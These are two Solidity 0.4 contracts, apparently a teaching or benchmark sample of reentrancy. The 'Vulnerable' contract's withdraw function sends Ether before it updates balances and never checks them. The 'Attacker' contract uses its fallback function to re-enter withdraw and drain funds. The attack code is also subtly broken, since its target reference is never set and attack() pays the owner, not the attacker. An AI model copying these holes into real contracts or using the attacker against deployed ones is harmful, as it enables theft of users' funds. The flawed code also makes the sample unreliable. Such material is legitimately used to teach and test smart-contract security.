pragma solidity ^0.4.18;

contract Vulnerable{
  mapping (address => uint) private userBalances;
  mapping (address => uint) private rewardsForA;
  uint public totalbalance = 0;

  function createUser() payable{ 
     rewardsForA[msg.sender] += msg.value;         
  } 

  function addToBalance() payable{ 
     userBalances[msg.sender] += msg.value; 
     totalbalance += msg.value;
  } 

  // Each recipient should only be able to claim the bonus once
  function getBonus(address recipient) public {
      uint amountToWithdraw = rewardsForA[recipient];
      rewardsForA[recipient] = 0;
      if (recipient.call.value(amountToWithdraw)() == false) {
              throw;
      }
      totalbalance -= amountToWithdraw;
  }

  function withdraw(uint _amount) public {   
    msg.sender.call.value(_amount)();
    userBalances[msg.sender] -= _amount;
    totalbalance -= _amount;
  }
}

pragma solidity ^0.4.18;
import './Vulnerable.sol';

contract Attacker{
  address private _owner;
  uint public count = 0;
  Vulnerable vul;

  //initial the attack contract with the vulnerable address
  function Attacker(){ 
     _owner = msg.sender;
  }

  function attack(){
    vul.getBonus(_owner);
  }

  function () payable{
     count++;
     if(count < 10){
       vul.withdraw(1 ether);
     }
  }
}

